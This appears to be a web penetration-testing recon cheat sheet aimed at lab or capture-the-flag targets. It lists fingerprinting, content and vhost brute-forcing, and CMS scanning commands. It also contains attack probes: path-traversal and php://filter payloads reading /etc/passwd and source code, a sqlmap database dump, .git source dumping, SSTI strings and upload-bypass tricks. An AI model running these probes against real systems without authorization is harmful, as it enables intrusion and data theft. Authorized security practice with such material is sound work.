# Web recon cheat sheet

## Fingerprint the stack
```bash
whatweb -a3 http://target/
curl -sI http://target/                      # headers: Server, X-Powered-By
curl -s http://target/ | grep -i generator   # CMS meta tag
# scryer already reports the server-side language (PHP/ASP.NET/Java/Python/Node)
# from headers + cookies + link extensions.
```

## Content discovery
```bash
# Directories/files — pick extensions matching the stack scryer reported
feroxbuster -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak -ac

# Recurse + interesting exts
feroxbuster -u http://target/ -w <list> -x php,phps,php.bak,zip,tar.gz,git -d 3
```

## Virtual hosts / subdomains
```bash
# scryer brute-forces Host headers automatically (unless --no-vhost).
# Manual equivalent, with catch-all filtering:
ffuf -u http://target/ -H "Host: FUZZ.target.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -fs 0
# Add the winners to /etc/hosts, then re-scan by name.
```

## Parameter discovery
```bash
# scryer uses paramvoid.  Manual:
paramvoid -u "http://target/index.php" -oT
ffuf -u "http://target/index.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline>
```

## Always-check files
```
/robots.txt  /sitemap.xml  /.git/  /.svn/  /.env  /backup.zip
/.htaccess   /web.config    /phpinfo.php  /server-status
/api  /swagger.json  /graphql  /.well-known/
```
```bash
# Exposed .git → dump the source
git-dumper http://target/.git/ ./loot
```

## Quick vuln probes
```bash
# LFI / path traversal
curl "http://target/page.php?file=../../../../etc/passwd"
curl "http://target/page.php?file=php://filter/convert.base64-encode/resource=index"

# SQLi (then sqlmap)
sqlmap -u "http://target/item.php?id=1" --batch --dbs

# SSTI test string (per engine): {{7*7}} ${7*7} <%= 7*7 %>
# Upload bypass: double ext (.php.jpg), null byte, magic-byte + .phtml/.phar
```

## CMS-specific
```bash
wpscan --url http://target/ --enumerate u,vp,vt --api-token <t>   # WordPress
droopescan scan drupal -u http://target/                          # Drupal
joomscan -u http://target/                                        # Joomla
# scryer flags Craft/Laravel/Grav/etc. and links known CVEs.
```
